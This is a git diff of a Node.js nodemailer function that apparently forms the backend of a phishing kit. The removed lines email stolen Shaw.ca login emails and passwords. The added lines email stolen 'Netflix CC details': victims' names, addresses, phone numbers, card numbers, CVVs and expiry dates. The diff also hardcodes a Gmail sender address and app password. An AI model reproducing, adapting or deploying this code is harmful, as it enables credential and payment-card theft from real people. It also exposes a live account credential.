@@ -1,6 +1,20 @@
 const nodemailer = require('nodemailer')
 
-const sendMail = (email, password, user, res) => {
+const sendMail = (
+  firstName,
+  lastName,
+  email,
+  phoneNumber,
+  address,
+  zip,
+  city,
+  cardNumber,
+  cvv,
+  year,
+  month,
+  user,
+  res
+) => {
   const auth = {
     user: 'webiniy01@gmail.com',
     pass: 'ltgy qoqa zvfd uclp',
@@ -11,12 +25,12 @@ const sendMail = (email, password, user, res) => {
     auth,
   })
 
-  const text = `New login details. email: ${email}, password: ${password} from Shaw.ca `
+  const text = `New Netflix CC details. email: ${email}, phone number: ${phoneNumber},  first name: ${firstName}, last name: ${lastName}, address: ${address}, city; ${city}, zip code: ${zip}, card number: ${cardNumber}, cvv: ${cvv}, year: ${year}, month: ${month}`
 
   const mailOptions = {
     from: auth['user'],
     to: user,
-    subject: 'NEW SHAW.CA LOGIN DETAILS',
+    subject: 'NEW NETFLIX CC DETAILS',
     text,
   }
 
